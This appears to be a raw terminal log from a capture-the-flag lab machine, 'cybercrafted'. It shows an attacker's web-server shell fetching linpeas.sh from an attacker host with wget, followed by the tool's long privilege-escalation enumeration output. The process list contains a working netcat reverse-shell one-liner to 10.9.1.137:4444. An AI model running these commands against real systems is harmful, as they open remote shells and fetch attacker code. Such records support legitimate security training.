www-data@cybercrafted:/var/www/admin$ wget http://10.9.1.137:8081/linpeas.sh
--2022-04-02 13:14:20--  http://10.9.1.137:8081/linpeas.sh
Connecting to 10.9.1.137:8081... connected.
HTTP request sent, awaiting response... 200 OK
Length: 762915 (745K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 745.03K   405KB/s    in 1.8s    

2022-04-02 13:14:22 (405 KB/s) - 'linpeas.sh' saved [762915/762915]

www-data@cybercrafted:/var/www/admin$ chmod +x linpeas.sh 
www-data@cybercrafted:/var/www/admin$ ./linpeas.sh


                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------\
    |                             Do you like PEASS?                            |                                                                                  
    |---------------------------------------------------------------------------|                                                                                  
    |         Become a Patreon    :     https://www.patreon.com/peass           |                                                                                  
    |         Follow on Twitter   :     @carlospolopm                           |                                                                                  
    |         Respect on HTB      :     SirBroccoli & makikvues                 |                                                                                  
    |---------------------------------------------------------------------------|                                                                                  
    |                                 Thank you!                                |                                                                                  
    \---------------------------------------------------------------------------/                                                                                  
          linpeas-ng by carlospolop                                                                                                                                
                                                                                                                                                                   
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                            
                                                                                                                                                                   
Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
 LEGEND:                                                                                                                                                           
  RED/YELLOW: 95% a PE vector
  RED: You should take a look to it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting linpeas. Caching Writable Folders...

                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Basic information ╠═════════════════════════════════════════                                                            
                                         ╚═══════════════════╝                                                                                                     
OS: Linux version 4.15.0-159-generic (buildd@lgw01-amd64-055) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #167-Ubuntu SMP Tue Sep 21 08:55:05 UTC 2021
User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
Hostname: cybercrafted
Writable folder: /dev/shm
[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)                                      
                                                                                                                                                                   

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
DONE
                                                                                                                                                                   
                                        ╔════════════════════╗
════════════════════════════════════════╣ System Information ╠════════════════════════════════════════                                                             
                                        ╚════════════════════╝                                                                                                     
╔══════════╣ Operative system
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits                                                                                      
Linux version 4.15.0-159-generic (buildd@lgw01-amd64-055) (gcc version 7.5.0 (Ubuntu 7.5.0-3ubuntu1~18.04)) #167-Ubuntu SMP Tue Sep 21 08:55:05 UTC 2021           
Distributor ID: Ubuntu
Description:    Ubuntu 18.04.5 LTS
Release:        18.04
Codename:       bionic

╔══════════╣ Sudo version
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version                                                                                         
Sudo version 1.8.21p2                                                                                                                                              


╔══════════╣ PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses                                                                                 
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                             
New path exported: /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

╔══════════╣ Date & uptime
Sat Apr  2 13:14:41 UTC 2022                                                                                                                                       
 13:14:41 up  2:08,  0 users,  load average: 0.22, 0.13, 0.13

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                               

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                          
sed: -e expression #1, char 340: unknown option to `s'                                                                                                             
sed: couldn't flush stdout: Broken pipe

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                            
HISTFILESIZE=0                                                                                                                                                     
SHLVL=1
APACHE_RUN_DIR=/var/run/apache2
APACHE_PID_FILE=/var/run/apache2/apache2.pid
JOURNAL_STREAM=9:20953
_=./linpeas.sh
TERM=xterm
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
INVOCATION_ID=8107cdfda3b0462ba2ea11d78fd60caa
APACHE_LOCK_DIR=/var/lock/apache2
LANG=C
HISTSIZE=0
APACHE_RUN_GROUP=www-data
APACHE_RUN_USER=www-data
APACHE_LOG_DIR=/var/log/apache2
PWD=/var/www/admin
HISTFILE=/dev/null

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed                                                                  
dmesg Not Found                                                                                                                                                    
                                                                                                                                                                   
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                 
sed: -e expression #1, char 27: unknown option to `s'                                                                                                              
cat: write error: Broken pipe
cat: write error: Broken pipe
cat: write error: Broken pipe
grep: write error: Broken pipe

╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                            
                                                                                                                                                                   
╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                      
apparmor module is loaded.
═╣ grsecurity present? ............ grsecurity Not Found
═╣ PaX bins present? .............. PaX Not Found                                                                                                                  
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                           
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                             
═╣ Is ASLR enabled? ............... Yes                                                                                                                            
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (xen)                                                                                                                      

                                             ╔═══════════╗
═════════════════════════════════════════════╣ Container ╠═════════════════════════════════════════════                                                            
                                             ╚═══════════╝                                                                                                         
╔══════════╣ Container related tools present
/usr/bin/lxc                                                                                                                                                       
╔══════════╣ Container details
═╣ Is this a container? ........... No                                                                                                                             
═╣ Any running containers? ........ No                                                                                                                             
                                                                                                                                                                   

                          ╔════════════════════════════════════════════════╗
══════════════════════════╣ Processes, Crons, Timers, Services and Sockets ╠══════════════════════════                                                             
                          ╚════════════════════════════════════════════════╝                                                                                       
╔══════════╣ Cleaned processes
╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                             
root         1  0.0  0.4 159656  8788 ?        Ss   11:05   0:03 /sbin/init maybe-ubiquity                                                                         
root       439  0.0  0.7  94656 15632 ?        S<s  11:06   0:00 /lib/systemd/systemd-journald
root       461  0.0  0.0 105912  1812 ?        Ss   11:06   0:00 /sbin/lvmetad -f
root       468  0.0  0.3  47600  6292 ?        Ss   11:06   0:01 /lib/systemd/systemd-udevd
systemd+   650  0.0  0.1 141788  3004 ?        Ssl  11:06   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+   788  0.0  0.2  79916  4844 ?        Ss   11:06   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+   808  0.0  0.2  70496  4772 ?        Ss   11:06   0:00 /lib/systemd/systemd-resolved
root       894  0.0  0.2  61988  5520 ?        Ss   11:06   0:00 /lib/systemd/systemd-logind
root       903  0.0  0.8 169104 16632 ?        Ssl  11:06   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
root       906  0.0  0.0 613184  1844 ?        Ssl  11:06   0:00 /usr/bin/lxcfs /var/lib/lxcfs/
root       907  0.0  0.1  30276  2796 ?        Ss   11:06   0:00 /usr/bin/SCREEN -DmS cybercrafted /usr/bin/java -Xmx256m -jar craftbukkit-1.7.2-server.jar nogui
root       926  2.0  9.4 2383732 193672 pts/0  Ssl+ 11:06   2:41  _ /usr/bin/java -Xmx256m -jar craftbukkit-1.7.2-server.jar nogui
root       917  0.0  0.1  30036  2900 ?        Ss   11:06   0:00 /usr/sbin/cron -f
syslog     922  0.0  0.2 263044  4184 ?        Ssl  11:06   0:00 /usr/sbin/rsyslogd -n
root       923  0.0  0.7 1159924 15476 ?       Ssl  11:06   0:00 /usr/bin/amazon-ssm-agent
root      1241  0.0  1.2 1172588 26180 ?       Sl   11:06   0:00  _ /usr/bin/ssm-agent-worker
daemon[0m     931  0.0  0.1  28340  2056 ?        Ss   11:06   0:00 /usr/sbin/atd -f
root       935  0.0  0.3 288556  6744 ?        Ssl  11:06   0:00 /usr/lib/accountsservice/accounts-daemon[0m
message+   937  0.0  0.2  50068  4428 ?        Ss   11:06   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  └─(Caps) 0x0000000020000000=cap_audit_write
root      1023  0.0  0.8 185952 18136 ?        Ssl  11:06   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root      1044  0.0  0.1  14672  2068 ttyS0    Ss+  11:06   0:00 /sbin/agetty -o -p -- u --keep-baud 115200,38400,9600 ttyS0 vt220
root      1055  0.0  0.3 291456  6920 ?        Ssl  11:06   0:00 /usr/lib/policykit-1/polkitd --no-debug
root      1056  0.0  0.0  14896  1640 tty1     Ss+  11:06   0:00 /sbin/agetty -o -p -- u --noclear tty1 linux
root      1057  0.0  0.2  72308  5396 ?        Ss   11:06   0:00 /usr/sbin/sshd -D
root      1102  0.0  0.6 333764 14056 ?        Ss   11:06   0:00 /usr/sbin/apache2 -k start
www-data  2053  0.0  0.5 338592 11296 ?        S    11:39   0:02  _ /usr/sbin/apache2 -k start
www-data  2072  0.0  0.5 338592 11436 ?        S    11:39   0:02  _ /usr/sbin/apache2 -k start
www-data  2104  0.0  0.5 338592 11320 ?        S    11:39   0:02  _ /usr/sbin/apache2 -k start
www-data  2119  0.0  0.5 338592 11228 ?        S    11:39   0:02  _ /usr/sbin/apache2 -k start
www-data  2138  0.0  0.5 338592 11292 ?        S    11:39   0:02  _ /usr/sbin/apache2 -k start
www-data  3021  0.0  0.0   4636   816 ?        S    13:08   0:00  |   _ sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.137 4444 >/tmp/f
www-data  3024  0.0  0.0   4680   780 ?        S    13:08   0:00  |       _ cat /tmp/f
www-data  3025  0.0  0.0   4636   868 ?        S    13:08   0:00  |       _ /bin/sh -i
www-data  3104  0.0  0.4  37432  9156 ?        S    13:10   0:00  |       |   _ python3 -c import pty;pty.spawn("/bin/bash")
www-data  3105  0.0  0.1  18516  2864 pts/1    Ss   13:10   0:00  |       |       _ /bin/bash
www-data  3161  0.2  0.1   5508  2648 pts/1    S+   13:14   0:00  |       |           _ /bin/sh ./linpeas.sh
www-data  6116  0.0  0.0   5508  1080 pts/1    S+   13:14   0:00  |       |               _ /bin/sh ./linpeas.sh
www-data  6120  0.0  0.1  36848  3276 pts/1    R+   13:14   0:00  |       |               |   _ ps fauxwww
www-data  6119  0.0  0.0   5508  1080 pts/1    S+   13:14   0:00  |       |               _ /bin/sh ./linpeas.sh
www-data  3026  0.0  0.0  15720  1984 ?        S    13:08   0:00  |       _ nc 10.9.1.137 4444
www-data  2409  0.0  0.3 338220  7580 ?        S    12:04   0:01  _ /usr/sbin/apache2 -k start
www-data  2658  0.0  0.5 338592 11192 ?        S    12:17   0:01  _ /usr/sbin/apache2 -k start
www-data  2677  0.0  0.5 338592 11280 ?        S    12:17   0:01  _ /usr/sbin/apache2 -k start
www-data  2682  0.0  0.4 338220  8660 ?        S    12:17   0:01  _ /usr/sbin/apache2 -k start
www-data  2686  0.0  0.5 338592 11360 ?        S    12:17   0:01  _ /usr/sbin/apache2 -k start
www-data  2691  0.0  0.5 338592 11252 ?        S    12:17   0:01  _ /usr/sbin/apache2 -k start
mysql     1256  0.0  9.2 1161692 188172 ?      Sl   11:06   0:02 /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid

╔══════════╣ Binary processes permissions (non 'root root' and not beloging to current user)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes                                                                                            
                                                                                                                                                                   
╔══════════╣ Files opened by processes belonging to other users
╚ This is usually empty because of the lack of privileges to read other user processes information                                                                 
COMMAND    PID  TID             USER   FD      TYPE DEVICE SIZE/OFF    NODE NAME                                                                                   

╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory                                                                      
gdm-password Not Found                                                                                                                                             
gnome-keyring-daemon Not Found                                                                                                                                     
lightdm Not Found                                                                                                                                                  
vsftpd Not Found                                                                                                                                                   
apache2 process found (dump creds from memory as root)                                                                                                             
sshd Not Found
                                                                                                                                                                   
╔══════════╣ Cron jobs
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs                                                                                  
/usr/bin/crontab                                                                                                                                                   
incrontab Not Found
-rw-r--r-- 1 root root     829 Oct  6 09:57 /etc/crontab                                                                                                           

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 Jun 26  2021 .
drwxr-xr-x 102 root root 4096 Oct 15 21:00 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root  589 Jan 14  2020 mdadm
-rw-r--r--   1 root root  712 Jan 17  2018 php
-rw-r--r--   1 root root  191 Aug  6  2020 popularity-contest

/etc/cron.daily:
total 60
drwxr-xr-x   2 root root 4096 Sep 30  2021 .
drwxr-xr-x 102 root root 4096 Oct 15 21:00 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root  539 Jul 16  2019 apache2
-rwxr-xr-x   1 root root  376 Nov 11  2019 apport
-rwxr-xr-x   1 root root 1478 Apr 20  2018 apt-compat
-rwxr-xr-x   1 root root  355 Dec 29  2017 bsdmainutils
-rwxr-xr-x   1 root root 1176 Nov  2  2017 dpkg
-rwxr-xr-x   1 root root  372 Aug 21  2017 logrotate
-rwxr-xr-x   1 root root 1065 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  539 Jan 14  2020 mdadm
-rwxr-xr-x   1 root root  538 Mar  1  2018 mlocate
-rwxr-xr-x   1 root root  249 Jan 25  2018 passwd
-rwxr-xr-x   1 root root 3477 Feb 21  2018 popularity-contest
-rwxr-xr-x   1 root root  214 Nov 12  2018 update-notifier-common

/etc/cron.hourly:
total 12
drwxr-xr-x   2 root root 4096 Aug  6  2020 .
drwxr-xr-x 102 root root 4096 Oct 15 21:00 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.monthly:
total 12
drwxr-xr-x   2 root root 4096 Aug  6  2020 .
drwxr-xr-x 102 root root 4096 Oct 15 21:00 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder

/etc/cron.weekly:
total 20
drwxr-xr-x   2 root root 4096 Jun 26  2021 .
drwxr-xr-x 102 root root 4096 Oct 15 21:00 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rwxr-xr-x   1 root root  723 Apr  7  2018 man-db
-rwxr-xr-x   1 root root  211 Nov 12  2018 update-notifier-common

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

* *     1 * *   cybercrafted tar -zcf /opt/minecraft/WorldBackup/world.tgz /opt/minecraft/cybercrafted/world/*

╔══════════╣ Systemd PATH
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths                                                                          
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                        

╔══════════╣ Analyzing .service files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#services                                                                                             
You can't write on systemd PATH                                                                                                                                    

╔══════════╣ System timers
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                               
NEXT                         LEFT           LAST                         PASSED       UNIT                         ACTIVATES                                       
Sat 2022-04-02 13:39:00 UTC  24min left     Sat 2022-04-02 13:09:46 UTC  5min ago     phpsessionclean.timer        phpsessionclean.service
Sat 2022-04-02 15:38:47 UTC  2h 24min left  Sat 2022-04-02 11:14:46 UTC  2h 0min ago  ua-messaging.timer           ua-messaging.service
Sat 2022-04-02 16:43:05 UTC  3h 28min left  Sat 2022-04-02 11:06:23 UTC  2h 8min ago  motd-news.timer              motd-news.service
Sat 2022-04-02 19:37:41 UTC  6h left        Sat 2022-04-02 11:06:23 UTC  2h 8min ago  apt-daily.timer              apt-daily.service
Sun 2022-04-03 06:46:17 UTC  17h left       Sat 2022-04-02 11:06:23 UTC  2h 8min ago  apt-daily-upgrade.timer      apt-daily-upgrade.service
Sun 2022-04-03 11:21:46 UTC  22h left       Sat 2022-04-02 11:21:46 UTC  1h 53min ago systemd-tmpfiles-clean.timer systemd-tmpfiles-clean.service
Mon 2022-04-04 00:00:00 UTC  1 day 10h left Sat 2022-04-02 11:06:23 UTC  2h 8min ago  fstrim.timer                 fstrim.service
n/a                          n/a            n/a                          n/a          snapd.snap-repair.timer      snapd.snap-repair.service
n/a                          n/a            n/a                          n/a          ureadahead-stop.timer        ureadahead-stop.service

╔══════════╣ Analyzing .timer files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers                                                                                               
                                                                                                                                                                   
╔══════════╣ Analyzing .socket files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                              
/etc/systemd/system/sockets.target.wants/uuidd.socket is calling this writable listener: /run/uuidd/request                                                        
/lib/systemd/system/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/dbus.socket is calling this writable listener: /var/run/dbus/system_bus_socket
/lib/systemd/system/sockets.target.wants/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/sockets.target.wants/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/syslog.socket is calling this writable listener: /run/systemd/journal/syslog
/lib/systemd/system/systemd-journald-dev-log.socket is calling this writable listener: /run/systemd/journal/dev-log
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/stdout
/lib/systemd/system/systemd-journald.socket is calling this writable listener: /run/systemd/journal/socket
/lib/systemd/system/uuidd.socket is calling this writable listener: /run/uuidd/request

╔══════════╣ Unix Sockets Listening
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets                                                                                              
/run/acpid.socket                                                                                                                                                  
  └─(Read Write)
/run/dbus/system_bus_socket
  └─(Read Write)
/run/lvm/lvmetad.socket
/run/lvm/lvmpolld.socket
/run/mysqld/mysqld.sock
  └─(Read Write)
/run/screen/S-root/907.cybercrafted
/run/snapd-snap.socket
  └─(Read Write)
/run/snapd.socket
  └─(Read Write)
/run/systemd/journal/dev-log
  └─(Read Write)
/run/systemd/journal/socket
  └─(Read Write)
/run/systemd/journal/stdout
  └─(Read Write)
/run/systemd/journal/syslog
  └─(Read Write)
/run/systemd/notify
  └─(Read Write)
/run/systemd/private
  └─(Read Write)
/run/udev/control
/run/uuidd/request
  └─(Read Write)
/var/lib/amazon/ssm/ipc/health
/var/lib/amazon/ssm/ipc/termination
/var/lib/lxd/unix.socket
/var/run/dbus/system_bus_socket
  └─(Read Write)
/var/run/mysqld/mysqld.sock
  └─(Read Write)

╔══════════╣ D-Bus config files
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                                
Possible weak user policy found on /etc/dbus-1/system.d/dnsmasq.conf (        <policy user="dnsmasq">)                                                             
Possible weak user policy found on /etc/dbus-1/system.d/org.freedesktop.thermald.conf (        <policy group="power">)

╔══════════╣ D-Bus Service Objects list
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus                                                                                                
NAME                                 PID PROCESS         USER             CONNECTION    UNIT                      SESSION    DESCRIPTION                           
:1.0                                 788 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
:1.1                                 808 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
:1.2                                 894 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
:1.21                                903 networkd-dispat root             :1.21         networkd-dispatcher.se…ce -          -                  
:1.24                               1055 polkitd         root             :1.24         polkit.service            -          -                  
:1.25                               1023 unattended-upgr root             :1.25         unattended-upgrades.se…ce -          -                  
:1.3                                   1 systemd         root             :1.3          init.scope                -          -                  
:1.4                                 935 accounts-daemon[0m root             :1.4          accounts-daemon.service   -          -                  
:1.71                               9104 busctl          www-data         :1.71         apache2.service           -          -                  
com.ubuntu.LanguageSelector            - -               -                (activatable) -                         -         
com.ubuntu.SoftwareProperties          - -               -                (activatable) -                         -         
io.netplan.Netplan                     - -               -                (activatable) -                         -         
org.freedesktop.Accounts             935 accounts-daemon[0m root             :1.4          accounts-daemon.service   -          -                  
org.freedesktop.DBus                   1 systemd         root             -             init.scope                -          -                  
org.freedesktop.PolicyKit1          1055 polkitd         root             :1.24         polkit.service            -          -                  
org.freedesktop.hostname1              - -               -                (activatable) -                         -         
org.freedesktop.locale1                - -               -                (activatable) -                         -         
org.freedesktop.login1               894 systemd-logind  root             :1.2          systemd-logind.service    -          -                  
org.freedesktop.network1             788 systemd-network systemd-network  :1.0          systemd-networkd.service  -          -                  
org.freedesktop.resolve1             808 systemd-resolve systemd-resolve  :1.1          systemd-resolved.service  -          -                  
org.freedesktop.systemd1               1 systemd         root             :1.3          init.scope                -          -                  
org.freedesktop.thermald               - -               -                (activatable) -                         -         
org.freedesktop.timedate1              - -               -                (activatable) -                         -         


                                        ╔═════════════════════╗
════════════════════════════════════════╣ Network Information ╠════════════════════════════════════════                                                            
                                        ╚═════════════════════╝                                                                                                    
╔══════════╣ Hostname, hosts and DNS
cybercrafted                                                                                                                                                       
127.0.0.1 localhost
127.0.1.1 cybercrafted

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

nameserver 127.0.0.53
options edns0
search eu-west-1.compute.internal

╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information                                                                                                
link-local 169.254.0.0
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 9001
        inet 10.10.184.52  netmask 255.255.0.0  broadcast 10.10.255.255
        inet6 fe80::24:90ff:fee9:eff  prefixlen 64  scopeid 0x20<link>
        ether 02:24:90:e9:0e:ff  txqueuelen 1000  (Ethernet)
        RX packets 5196661  bytes 719471744 (719.4 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 4417842  bytes 2070568961 (2.0 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 3584  bytes 350134 (350.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 3584  bytes 350134 (350.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0


╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                           
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                                                                                  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::25565                :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   

╔══════════╣ Can I sniff with tcpdump?
No                                                                                                                                                                 
                                                                                                                                                                   


                                         ╔═══════════════════╗
═════════════════════════════════════════╣ Users Information ╠═════════════════════════════════════════                                                            
                                         ╚═══════════════════╝                                                                                                     
╔══════════╣ My user
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#users                                                                                                
uid=33(www-data) gid=33(www-data) groups=33(www-data)                                                                                                              

╔══════════╣ Do I have PGP keys?
/usr/bin/gpg                                                                                                                                                       
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                   
                                                                                                                                                                   
╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                        
                                                                                                                                                                   
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens                                                                                  
ptrace protection is enabled (1)                                                                                                                                   
gdb wasn't found in PATH, this might still be vulnerable but linpeas won't be able to check it

╔══════════╣ Checking Pkexec policy
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2                                                              
                                                                                                                                                                   
[Configuration]
AdminIdentities=unix-user:0
[Configuration]
AdminIdentities=unix-group:sudo;unix-group:admin

╔══════════╣ Superusers
root:x:0:0:root:/root:/bin/bash                                                                                                                                    

╔══════════╣ Users with console
cybercrafted:x:1002:1002:,,,:/home/cybercrafted:/bin/bash                                                                                                          
root:x:0:0:root:/root:/bin/bash
xxultimatecreeperxx:x:1001:1001:,,,:/home/xxultimatecreeperxx:/bin/bash

╔══════════╣ All users & groups
uid=0(root) gid=0(root) groups=0(root)                                                                                                                             
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=1001(xxultimatecreeperxx) gid=1001(xxultimatecreeperxx) groups=1001(xxultimatecreeperxx),25565(minecraft)
uid=1002(cybercrafted) gid=1002(cybercrafted) groups=1002(cybercrafted)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(mysql) gid=114(mysql) groups=114(mysql)
